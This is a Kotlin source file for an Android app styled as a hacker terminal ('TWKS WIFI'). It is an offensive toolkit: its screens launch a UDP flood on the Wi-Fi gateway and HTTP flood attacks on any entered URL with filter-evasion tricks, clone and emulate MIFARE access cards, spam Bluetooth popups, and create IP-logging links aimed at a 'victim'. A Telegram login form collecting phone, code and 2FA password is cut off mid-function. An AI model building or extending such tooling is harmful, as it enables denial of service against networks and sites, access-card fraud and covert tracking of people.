package com.twks.wifi

import android.Manifest
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.nfc.NfcAdapter
import android.nfc.Tag
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import java.io.File

class MainActivity : ComponentActivity() {
    private val locationPermissionRequest = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted -> if (!isGranted) finish() }

    private var nfcAdapter: NfcAdapter? = null
    private var pendingIntent: PendingIntent? = null
    private var intentFiltersArray: Array<IntentFilter>? = null
    private var techListsArray: Array<Array<String>>? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            if (cm != null) {
                val request = NetworkRequest.Builder()
                    .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                    .build()
                cm.requestNetwork(request, object : ConnectivityManager.NetworkCallback() {
                    override fun onAvailable(network: Network) {
                        try { cm.bindProcessToNetwork(network) } catch (e: Exception) {}
                    }
                })
            }
        } catch (e: Exception) {}

        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                locationPermissionRequest.launch(Manifest.permission.ACCESS_FINE_LOCATION)
            }
        } catch (e: Exception) {}

        if (android.os.Build.VERSION.SDK_INT >= 31) {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.BLUETOOTH_ADVERTISE) != PackageManager.PERMISSION_GRANTED) {
                    requestPermissions(arrayOf(Manifest.permission.BLUETOOTH_ADVERTISE, Manifest.permission.BLUETOOTH_CONNECT), 2)
                }
            } catch (e: Exception) {}
        }

        nfcAdapter = NfcAdapter.getDefaultAdapter(this)
        pendingIntent = PendingIntent.getActivity(
            this, 0, Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP),
            PendingIntent.FLAG_MUTABLE
        )
        intentFiltersArray = arrayOf(IntentFilter(NfcAdapter.ACTION_TECH_DISCOVERED))
        techListsArray = arrayOf(arrayOf("android.nfc.tech.MifareClassic"), arrayOf("android.nfc.tech.NfcUltralight"))

        setContent {
            MaterialTheme(colors = darkColors(background = Color.Black, primary = Color(0xFF00FF41), onBackground = Color(0xFF00FF41))) {
                TerminalApp(this)
            }
        }
    }

    override fun onResume() {
        super.onResume()
        nfcAdapter?.enableForegroundDispatch(this, pendingIntent, intentFiltersArray, techListsArray)
    }

    override fun onPause() {
        super.onPause()
        nfcAdapter?.disableForegroundDispatch(this)
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        if (NfcAdapter.ACTION_TECH_DISCOVERED == intent.action) {
            val tag = intent.getParcelableExtra<Tag>(NfcAdapter.EXTRA_TAG)
            tag?.let { handleTag(it) }
        }
    }

    private fun handleTag(tag: Tag) {
        when (cardMode) {
            "READ" -> {
                val dump = CardCloner.readCard(tag)
                if (dump != null) {
                    lastDump = dump
                    runOnUiThread {
                        Toast.makeText(this, "Card read: ${dump.uid.joinToString("") { "%02X".format(it) }}", Toast.LENGTH_SHORT).show()
                    }
                } else {
                    runOnUiThread {
                        Toast.makeText(this, "Read failed: unsupported or locked card", Toast.LENGTH_SHORT).show()
                    }
                }
            }
            "WRITE" -> {
                lastDump?.let { dump ->
                    val success = CardCloner.writeCard(tag, dump)
                    runOnUiThread {
                        Toast.makeText(this, if (success) "Write OK" else "Write failed", Toast.LENGTH_SHORT).show()
                    }
                }
            }
        }
    }

    companion object {
        var cardMode: String = ""
        var lastDump: CardDump? = null
    }

    override fun onDestroy() {
        super.onDestroy()
        FloodEngine.stopFlood()
        SiteFloodEngine.stopFlood()
        BleSpam.stop()
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            cm?.bindProcessToNetwork(null)
        } catch (e: Exception) {}
    }
}

val Green = Color(0xFF00FF41)
val DimGreen = Color(0xFF008F24)
val Red = Color(0xFFFF003C)
val Gold = Color(0xFFFFD700)

@Composable
fun TopBar(title: String, onBack: (() -> Unit)? = null) {
    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
        if (onBack != null) {
            Text(
                "←",
                color = Green,
                fontSize = 26.sp,
                fontFamily = FontFamily.Monospace,
                fontWeight = FontWeight.Bold,
                modifier = Modifier.clickable { onBack() }.padding(end = 12.dp)
            )
        }
        Text(title, color = Green, fontSize = 16.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
    }
    Spacer(modifier = Modifier.height(8.dp))
    Divider(color = DimGreen, thickness = 1.dp)
    Spacer(modifier = Modifier.height(16.dp))
}

@Composable
fun TerminalApp(context: ComponentActivity) {
    var screen by remember { mutableStateOf("MAIN_MENU") }
    val ctx = LocalContext.current

    Surface(color = Color.Black, modifier = Modifier.fillMaxSize()) {
        Column(modifier = Modifier.padding(16.dp).statusBarsPadding()) {
            when (screen) {
                "MAIN_MENU" -> MainMenuScreen(
                    onWiFiDoS = { screen = "WIFI_MENU" },
                    onCloneCard = { screen = "CLONE_CARD" },
                    onSiteDoS = { screen = "SITE_ATTACK" },
                    onBleSpam = { screen = "BLE_SPAM" },
                    onIpLogger = { screen = "IP_LOGGER" },
                    onBooster = { screen = "BOOSTER" },
                    onTgGifts = { screen = "TG_GIFTS" }
                )
                "WIFI_MENU" -> WiFiMenuScreen(
                    onSelectTarget = { screen = "WIFI_TARGETS" },
                    onLaunchAttack = {
                        if (!NetworkEngine.isConnectedToWifi(ctx)) {
                            Toast.makeText(ctx, "Подключитесь к Wi-Fi", Toast.LENGTH_SHORT).show()
                        } else {
                            screen = "WIFI_ATTACK"
                        }
                    },
                    onBack = { screen = "MAIN_MENU" }
                )
                "WIFI_TARGETS" -> WiFiTargetListScreen(ctx,
                    onSelected = { screen = "WIFI_MENU" },
                    onBack = { screen = "WIFI_MENU" }
                )
                "WIFI_ATTACK" -> WiFiAttackScreen(onBack = { screen = "WIFI_MENU" })
                "SITE_ATTACK" -> SiteAttackScreen(onBack = { screen = "MAIN_MENU" })
                "CLONE_CARD" -> CloneCardScreen(onApdu = { screen = "APDU_LOG" }, onBack = { screen = "MAIN_MENU" })
                "APDU_LOG" -> ApduLogScreen(onBack = { screen = "CLONE_CARD" })
                "BLE_SPAM" -> BleSpamScreen(onBack = { screen = "MAIN_MENU" })
                "IP_LOGGER" -> IpLoggerScreen(onBack = { screen = "MAIN_MENU" })
                "BOOSTER" -> BoostScreen(onBack = { screen = "MAIN_MENU" })
                "TG_GIFTS" -> TgGiftScreen(onBack = { screen = "MAIN_MENU" })
            }
        }
    }
}

@Composable
fun MenuRow(num: String, label: String, onClick: () -> Unit) {
    Button(onClick = onClick, colors = ButtonDefaults.buttonColors(backgroundColor = Color.Transparent), modifier = Modifier.fillMaxWidth().padding(vertical = 5.dp)) {
        Row {
            Text("[ $num ] ", color = DimGreen, fontSize = 18.sp, fontFamily = FontFamily.Monospace)
            Text(label, color = Green, fontSize = 18.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
            Text("  >>>", color = DimGreen, fontSize = 18.sp, fontFamily = FontFamily.Monospace)
        }
    }
}

@Composable
fun MainMenuScreen(onWiFiDoS: () -> Unit, onCloneCard: () -> Unit, onSiteDoS: () -> Unit, onBleSpam: () -> Unit, onIpLogger: () -> Unit, onBooster: () -> Unit, onTgGifts: () -> Unit) {
    val ctx = LocalContext.current
    var btOn by remember { mutableStateOf(false) }
    var wifiOn by remember { mutableStateOf(false) }
    LaunchedEffect(Unit) {
        val bm = ctx.getSystemService(Context.BLUETOOTH_SERVICE) as? android.bluetooth.BluetoothManager
        btOn = bm?.adapter?.isEnabled == true
        wifiOn = NetworkEngine.isConnectedToWifi(ctx)
    }
    Column {
        Text("─[ TWKS WIFI // v4.11.6 ]──────┐", color = Green, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
        Text("│ wifi · nfc · site · ble · ip  │", color = DimGreen, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
        Text("└───────────────────────────────┘", color = Green, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.height(20.dp))
        MenuRow("01", "WIFI DOS", onWiFiDoS)
        MenuRow("02", "NFC CLONE", onCloneCard)
        MenuRow("03", "SITE DOS", onSiteDoS)
        MenuRow("04", "BLE SPAM", onBleSpam)
        MenuRow("05", "IP LOGGER", onIpLogger)
        MenuRow("06", "BOOSTER", onBooster)
        MenuRow("07", "TG GIFTS", onTgGifts)
        Spacer(modifier = Modifier.weight(1f))
        Text("BT: ${if (btOn) "ON" else "OFF"} · WIFI: ${if (wifiOn) "ON" else "OFF"}", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
    }
}

@Composable
fun WiFiMenuScreen(onSelectTarget: () -> Unit, onLaunchAttack: () -> Unit, onBack: () -> Unit) {
    Column {
        TopBar("WiFi DoS") { onBack() }
        Text("[AUTO-SPOOF] MAC rotate + random ports + payload mutate", color = Gold, fontSize = 11.sp, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.height(16.dp))

        Button(onClick = onSelectTarget, colors = ButtonDefaults.buttonColors(backgroundColor = Color.Transparent), modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp)) {
            Text("[ 01 ] SELECT TARGET", color = Green, fontSize = 18.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
        }
        Button(onClick = onLaunchAttack, colors = ButtonDefaults.buttonColors(backgroundColor = Color.Transparent), modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp)) {
            Text("[ 02 ] LAUNCH ATTACK", color = Green, fontSize = 18.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
        }
    }
}

@Composable
fun WiFiTargetListScreen(context: Context, onSelected: () -> Unit, onBack: () -> Unit) {
    var networks by remember { mutableStateOf<List<WifiNetwork>>(emptyList()) }

    LaunchedEffect(Unit) {
        networks = NetworkEngine.scanNetworks(context)
    }

    Column {
        TopBar("SELECT TARGET") { onBack() }
        Text("SCANNING...", color = Green, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.height(16.dp))

        if (networks.isEmpty()) {
            Text("[-] No networks found.", color = Red, fontFamily = FontFamily.Monospace)
        }

        LazyColumn(modifier = Modifier.weight(1f)) {
            items(networks) { net ->
                Button(onClick = onSelected, colors = ButtonDefaults.buttonColors(backgroundColor = Color.Transparent), modifier = Modifier.fillMaxWidth()) {
                    Text(">> ${net.ssid} [${net.bssid}]", color = if (net.isConnected) Green else DimGreen, fontFamily = FontFamily.Monospace)
                }
            }
        }
    }
}

@Composable
fun WiFiAttackScreen(onBack: () -> Unit) {
    val ctx = LocalContext.current
    var isAttacking by remember { mutableStateOf(false) }
    var packetCount by remember { mutableStateOf(0L) }
    var pps by remember { mutableStateOf(0L) }
    val scope = rememberCoroutineScope()
    val gatewayIp = NetworkEngine.getGatewayIp(ctx) ?: "192.168.1.1"

    LaunchedEffect(isAttacking) {
        if (isAttacking) {
            var lastCount = FloodEngine.getPacketCount()
            var lastTime = System.currentTimeMillis()
            while (isAttacking && currentCoroutineContext().isActive) {
                delay(500)
                val currentCount = FloodEngine.getPacketCount()
                val currentTime = System.currentTimeMillis()
                val timeDiff = (currentTime - lastTime) / 1000.0
                pps = if (timeDiff > 0) ((currentCount - lastCount) / timeDiff).toLong() else 0L
                lastCount = currentCount
                lastTime = currentTime
                packetCount = currentCount
            }
        } else {
            pps = 0
        }
    }

    Column {
        TopBar("WiFi ATTACK") {
            isAttacking = false
            FloodEngine.stopFlood()
            onBack()
        }

        Text("TARGET: $gatewayIp", color = Green, fontFamily = FontFamily.Monospace)
        Text("VECTOR: UDP burst x3 // 192 threads", color = DimGreen, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.height(16.dp))
        Text("TOTAL PACKETS: $packetCount", color = DimGreen, fontSize = 16.sp, fontFamily = FontFamily.Monospace)
        Text("THROUGHPUT: $pps PPS", color = if (isAttacking) Red else DimGreen, fontSize = 32.sp, fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.weight(1f))

        if (isAttacking) {
            Button(onClick = {
                isAttacking = false
                FloodEngine.stopFlood()
            }, colors = ButtonDefaults.buttonColors(backgroundColor = Red), modifier = Modifier.fillMaxWidth()) {
                Text("[ ABORT ATTACK ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
            }
        } else {
            Button(onClick = {
                isAttacking = true
                scope.launch(Dispatchers.IO) {
                    FloodEngine.startFlood(gatewayIp, 192)
                }
            }, colors = ButtonDefaults.buttonColors(backgroundColor = Green), modifier = Modifier.fillMaxWidth()) {
                Text("[ EXECUTE FLOOD ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
            }
        }
    }
}

@Composable
fun SiteAttackScreen(onBack: () -> Unit) {
    var targetUrl by remember { mutableStateOf("") }
    var isAttacking by remember { mutableStateOf(false) }
    var requestCount by remember { mutableStateOf(0L) }
    var rps by remember { mutableStateOf(0L) }
    var mode by remember { mutableStateOf(0) }
    val scope = rememberCoroutineScope()

    LaunchedEffect(isAttacking) {
        if (isAttacking) {
            var lastCount = SiteFloodEngine.getRequestCount()
            var lastTime = System.currentTimeMillis()
            while (isAttacking && currentCoroutineContext().isActive) {
                delay(500)
                val currentCount = SiteFloodEngine.getRequestCount()
                val currentTime = System.currentTimeMillis()
                val timeDiff = (currentTime - lastTime) / 1000.0
                rps = if (timeDiff > 0) ((currentCount - lastCount) / timeDiff).toLong() else 0L
                lastCount = currentCount
                lastTime = currentTime
                requestCount = currentCount
            }
        } else {
            rps = 0
        }
    }

    Column {
        TopBar("Site ATTACK") {
            isAttacking = false
            SiteFloodEngine.stopFlood()
            onBack()
        }

        if (!isAttacking) {
            OutlinedTextField(
                value = targetUrl,
                onValueChange = { targetUrl = it },
                label = { Text("Enter URL (e.g., google.com)", color = DimGreen, fontFamily = FontFamily.Monospace) },
                colors = TextFieldDefaults.outlinedTextFieldColors(
                    textColor = Green,
                    focusedBorderColor = Green,
                    unfocusedBorderColor = DimGreen,
                    cursorColor = Green
                ),
                modifier = Modifier.fillMaxWidth(),
                singleLine = true
            )
            Spacer(modifier = Modifier.height(12.dp))

            Text("VECTOR:", color = DimGreen, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
            Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                VectorChip("GET FLOOD", mode == 0) { mode = 0 }
                VectorChip("HEAD FLOOD", mode == 1) { mode = 1 }
                VectorChip("SLOW HOLD", mode == 2) { mode = 2 }
            }
            Spacer(modifier = Modifier.height(12.dp))
        } else {
            Text("TARGET: $targetUrl", color = Green, fontFamily = FontFamily.Monospace)
            Text("VECTOR: ${listOf("GET FLOOD", "HEAD FLOOD", "SLOW HOLD")[mode]} // 128 threads", color = DimGreen, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
            Spacer(modifier = Modifier.height(12.dp))
        }

        Text("BYPASS: UA rotate · header spoof · cache-bust · jitter", color = Gold, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.height(12.dp))
        Text("TOTAL REQUESTS: $requestCount", color = DimGreen, fontSize = 16.sp, fontFamily = FontFamily.Monospace)
        Text("THROUGHPUT: $rps RPS", color = if (isAttacking) Red else DimGreen, fontSize = 32.sp, fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.weight(1f))

        if (isAttacking) {
            Button(onClick = {
                isAttacking = false
                SiteFloodEngine.stopFlood()
            }, colors = ButtonDefaults.buttonColors(backgroundColor = Red), modifier = Modifier.fillMaxWidth()) {
                Text("[ ABORT ATTACK ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
            }
        } else {
            Button(
                onClick = {
                    if (targetUrl.isNotEmpty()) {
                        isAttacking = true
                        scope.launch(Dispatchers.IO) {
                            SiteFloodEngine.startFlood(targetUrl, 128, mode)
                        }
                    }
                },
                enabled = targetUrl.isNotEmpty(),
                colors = ButtonDefaults.buttonColors(backgroundColor = if (targetUrl.isNotEmpty()) Green else DimGreen),
                modifier = Modifier.fillMaxWidth()
            ) {
                Text("[ EXECUTE FLOOD ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
            }
        }
    }
}

@Composable
fun VectorChip(label: String, selected: Boolean, onClick: () -> Unit) {
    Box(
        modifier = Modifier
            .clickable { onClick() }
            .padding(horizontal = 10.dp, vertical = 6.dp)
    ) {
        Text(
            "[ $label ]",
            color = if (selected) Gold else DimGreen,
            fontSize = 12.sp,
            fontFamily = FontFamily.Monospace,
            fontWeight = if (selected) FontWeight.Bold else FontWeight.Normal
        )
    }
}

@Composable
fun CloneCardScreen(onApdu: () -> Unit, onBack: () -> Unit) {
    val ctx = LocalContext.current
    var status by remember { mutableStateOf("Ready") }
    var dumpInfo by remember { mutableStateOf<String?>(null) }
    val scope = rememberCoroutineScope()

    LaunchedEffect(MainActivity.lastDump) {
        MainActivity.lastDump?.let { dump ->
            dumpInfo = "UID: ${dump.uid.joinToString("") { "%02X".format(it) }}\n" +
                    "ATQA: ${dump.atqa.joinToString("") { "%02X".format(it) }}\n" +
                    "SAK: %02X".format(dump.sak) + "\n" +
                    "Sectors: ${dump.sectors.size} | Opened: ${dump.sectors.count { it.blocks.isNotEmpty() }}/${dump.sectors.size}"
        }
    }

    Column {
        TopBar("CLONE CARD") { onBack() }

        Text(status, color = Gold, fontSize = 14.sp, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.height(16.dp))

        dumpInfo?.let { info ->
            Text("DUMP LOADED:", color = Green, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
            Text(info, color = DimGreen, fontSize = 11.sp, fontFamily = FontFamily.Monospace)
            Spacer(modifier = Modifier.height(16.dp))
        }

        Button(onClick = {
            MainActivity.cardMode = "READ"
            status = "Bring card to NFC reader..."
            scope.launch {
                delay(30000)
                if (MainActivity.cardMode == "READ") {
                    MainActivity.cardMode = ""
                    status = "Timeout"
                }
            }
        }, colors = ButtonDefaults.buttonColors(backgroundColor = Green), modifier = Modifier.fillMaxWidth()) {
            Text("[ READ CARD ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
        }
        Spacer(modifier = Modifier.height(8.dp))

        Button(
            onClick = {
                if (MainActivity.lastDump != null) {
                    MainActivity.cardMode = "WRITE"
                    status = "Bring target card to NFC reader..."
                    scope.launch {
                        delay(30000)
                        if (MainActivity.cardMode == "WRITE") {
                            MainActivity.cardMode = ""
                            status = "Timeout"
                        }
                    }
                } else {
                    status = "No dump loaded"
                }
            },
            enabled = MainActivity.lastDump != null,
            colors = ButtonDefaults.buttonColors(backgroundColor = if (MainActivity.lastDump != null) Green else DimGreen),
            modifier = Modifier.fillMaxWidth()
        ) {
            Text("[ WRITE CARD ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
        }
        Spacer(modifier = Modifier.height(8.dp))

        Button(onClick = {
            MainActivity.lastDump?.let { dump ->
                val file = File(ctx.filesDir, "card_dump.bin")
                CardCloner.saveDump(file, dump)
                status = "Saved to ${file.absolutePath}"
            } ?: run { status = "No dump to save" }
        }, colors = ButtonDefaults.buttonColors(backgroundColor = DimGreen), modifier = Modifier.fillMaxWidth()) {
            Text("[ SAVE DUMP ]", color = Color.Black, fontFamily = FontFamily.Monospace)
        }
        Spacer(modifier = Modifier.height(8.dp))

        Button(onClick = {
            val file = File(ctx.filesDir, "card_dump.bin")
            if (file.exists()) {
                MainActivity.lastDump = CardCloner.loadDump(file)
                status = "Loaded from ${file.absolutePath}"
            } else {
                status = "No saved dump found"
            }
        }, colors = ButtonDefaults.buttonColors(backgroundColor = DimGreen), modifier = Modifier.fillMaxWidth()) {
            Text("[ LOAD DUMP ]", color = Color.Black, fontFamily = FontFamily.Monospace)
        }
        Spacer(modifier = Modifier.height(8.dp))
        Button(onClick = onApdu, colors = ButtonDefaults.buttonColors(backgroundColor = Color.Transparent), modifier = Modifier.fillMaxWidth()) {
            Text("[ APDU LOG ]", color = DimGreen, fontSize = 14.sp, fontFamily = FontFamily.Monospace)
        }

        Spacer(modifier = Modifier.weight(1f))
        Text("PHONE-AS-CARD: HCE live. With dump loaded and screen on, phone answers APDU-readers as this card.", color = Gold, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.height(4.dp))
        Text("Supports MIFARE Classic 1K/4K + Ultralight, mfoc key set, Gen1a backdoor", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
    }
}

@Composable
fun ApduLogScreen(onBack: () -> Unit) {
    val ctx = LocalContext.current
    var lines by remember { mutableStateOf<List<String>>(emptyList()) }
    LaunchedEffect(Unit) {
        lines = try { File(ctx.filesDir, "apdu_log.txt").readLines().takeLast(60) } catch (e: Exception) { emptyList() }
    }
    Column {
        TopBar("APDU LOG") { onBack() }
        if (lines.isEmpty()) {
            Text("No reader requests logged yet. Tap phone to a reader with dump loaded.", color = DimGreen, fontSize = 11.sp, fontFamily = FontFamily.Monospace)
        }
        LazyColumn {
            items(lines) { l ->
                Text(l, color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
            }
        }
    }
}

@Composable
fun BleSpamScreen(onBack: () -> Unit) {
    val ctx = LocalContext.current
    var mode by remember { mutableStateOf(0) }
    var running by remember { mutableStateOf(false) }
    val names = listOf("APPLE", "ANDROID", "SAMSUNG", "WINDOWS", "MIX")
    var status by remember { mutableStateOf(BleSpam.status) }

    LaunchedEffect(running) {
        while (running && currentCoroutineContext().isActive) {
            status = BleSpam.status
            delay(500)
        }
        status = BleSpam.status
    }

    Column {
        TopBar("BLE SPAM") {
            if (running) { BleSpam.stop(); running = false }
            onBack()
        }
        Text("TARGET OS:", color = DimGreen, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
        Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            names.forEachIndexed { i, n ->
                VectorChip(n, mode == i) { if (!running) mode = i }
            }
        }
        Spacer(modifier = Modifier.height(12.dp))
        Text("STATUS: $status", color = if (running) Green else Gold, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
        Text("Targets must be UNLOCKED with screen ON to show popups.", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
        Text("If STATUS says NO PERM: tap EXECUTE again after the dialog.", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
        Text("Lab use: your own devices and consenting friends.", color = Gold, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.weight(1f))

        if (running) {
            Button(onClick = {
                BleSpam.stop()
                running = false
            }, colors = ButtonDefaults.buttonColors(backgroundColor = Red), modifier = Modifier.fillMaxWidth()) {
                Text("[ ABORT SPAM ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
            }
        } else {
            Button(onClick = {
                if (BleSpam.needsPermission(ctx)) {
                    (ctx as? ComponentActivity)?.requestPermissions(
                        arrayOf(Manifest.permission.BLUETOOTH_ADVERTISE, Manifest.permission.BLUETOOTH_CONNECT), 2
                    )
                }
                BleSpam.start(ctx, mode)
                running = true
            }, colors = ButtonDefaults.buttonColors(backgroundColor = Green), modifier = Modifier.fillMaxWidth()) {
                Text("[ EXECUTE SPAM ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
            }
        }
    }
}

@Composable
fun IpLoggerScreen(onBack: () -> Unit) {
    var target by remember { mutableStateOf("https://") }
    var link by remember { mutableStateOf<String?>(null) }
    var logs by remember { mutableStateOf(listOf<LogEntry>()) }
    var status by remember { mutableStateOf("") }
    val scope = rememberCoroutineScope()

    LaunchedEffect(Unit) {
        while (currentCoroutineContext().isActive) {
            delay(10000)
            if (IpLogger.token != null) logs = withContext(Dispatchers.IO) { IpLogger.fetchLogs() }
        }
    }

    Column {
        TopBar("IP LOGGER") { onBack() }

        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text("Redirect target (victim lands here)", color = DimGreen, fontFamily = FontFamily.Monospace) },
            colors = TextFieldDefaults.outlinedTextFieldColors(
                textColor = Green,
                focusedBorderColor = Green,
                unfocusedBorderColor = DimGreen,
                cursorColor = Green
            ),
            modifier = Modifier.fillMaxWidth(),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(12.dp))

        Button(onClick = {
            scope.launch {
                status = "CREATING..."
                val ok = withContext(Dispatchers.IO) { IpLogger.create(target) }
                link = ok?.let { IpLogger.loggerUrl() }
                status = if (link != null) "LOGGER LIVE" else "CREATE FAILED"
            }
        }, colors = ButtonDefaults.buttonColors(backgroundColor = Green), modifier = Modifier.fillMaxWidth()) {
            Text("[ CREATE LOGGER ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
        }
        Spacer(modifier = Modifier.height(8.dp))

        Button(onClick = {
            scope.launch {
                val l = link ?: return@launch
                status = withContext(Dispatchers.IO) { IpLogger.selfTest(l) }
                logs = withContext(Dispatchers.IO) { IpLogger.fetchLogs() }
            }
        }, colors = ButtonDefaults.buttonColors(backgroundColor = DimGreen), modifier = Modifier.fillMaxWidth()) {
            Text("[ SELF TEST ]", color = Color.Black, fontFamily = FontFamily.Monospace)
        }
        Spacer(modifier = Modifier.height(8.dp))

        Text(status, color = Gold, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
        link?.let { l ->
            Text("LINK: $l", color = Green, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
            Text("Click = IP + UA + referer logged, then 302 to target.", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
        }
        Spacer(modifier = Modifier.height(12.dp))

        Button(onClick = {
            scope.launch {
                logs = withContext(Dispatchers.IO) { IpLogger.fetchLogs() }
            }
        }, colors = ButtonDefaults.buttonColors(backgroundColor = DimGreen), modifier = Modifier.fillMaxWidth()) {
            Text("[ REFRESH LOGS ]", color = Color.Black, fontFamily = FontFamily.Monospace)
        }
        Spacer(modifier = Modifier.height(8.dp))

        LazyColumn(modifier = Modifier.weight(1f)) {
            items(logs) { e ->
                Text("${e.date} | ${e.ip} | ${e.ua.take(38)} | ref:${e.referer.take(18)}", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
            }
        }
    }
}


@Composable
fun BoostScreen(onBack: () -> Unit) {
    val ctx = LocalContext.current
    var lines by remember { mutableStateOf(listOf<String>()) }
    var busy by remember { mutableStateOf(false) }
    val scope = rememberCoroutineScope()

    Column {
        TopBar("BOOSTER") { onBack() }
        Text("Root tweaks: wifi powersave off, BBR, tcp stack, cpu performance.", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
        Text("Ping measured before and after, effect shown in ms.", color = DimGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
        Spacer(modifier = Modifier.height(12.dp))

        LazyColumn(modifier = Modifier.weight(1f)) {
            items(lines) { l ->
                Text(l, color = Green, fontSize = 11.sp, fontFamily = FontFamily.Monospace)
            }
        }
        Spacer(modifier = Modifier.height(8.dp))

        Button(
            onClick = {
                if (!busy) {
                    busy = true
                    lines = listOf("MEASURING...")
                    scope.launch {
                        val gw = NetworkEngine.getGatewayIp(ctx) ?: "1.1.1.1"
                        val r = Booster.boost(gw)
                        lines = r.lines
                        busy = false
                    }
                }
            },
            enabled = !busy,
            colors = ButtonDefaults.buttonColors(backgroundColor = if (busy) DimGreen else Green),
            modifier = Modifier.fillMaxWidth()
        ) {
            Text(if (busy) "[ BOOSTING... ]" else "[ RUN BOOST ]", color = Color.Black, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
        }
        Spacer(modifier = Modifier.height(8.dp))
        Button(onClick = {
            scope.launch { lines = Booster.restore() }
        }, colors = ButtonDefaults.buttonColors(backgroundColor = Color.Transparent), modifier = Modifier.fillMaxWidth()) {
            Text("[ RESTORE DEFAULTS ]", color = DimGreen, fontFamily = FontFamily.Monospace)
        }
    }
}


@Composable
fun TgGiftScreen(onBack: () -> Unit) {
    val ctx = LocalContext.current
    val prefs = ctx.getSharedPreferences("twks", 0)
    var server by remember { mutableStateOf(prefs.getString("tg_server", "https://") ?: "https://") }
    var apiId by remember { mutableStateOf(prefs.getString("tg_api_id", "") ?: "") }
    var apiHash by remember { mutableStateOf(prefs.getString("tg_api_hash", "") ?: "") }
    var phone by remember { mutableStateOf("") }
    var code by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }
    var username by remember { mutableStateOf("") }
    var status by remember { mutableStateOf("not connected") }
    var configured by remember { mutableStateOf(false) }
    var loggedIn by remember { mutableStateOf(false) }
    var need2fa by remember { mutableStateOf(false) }
    var codeHash by remember { mutableStateOf("") }
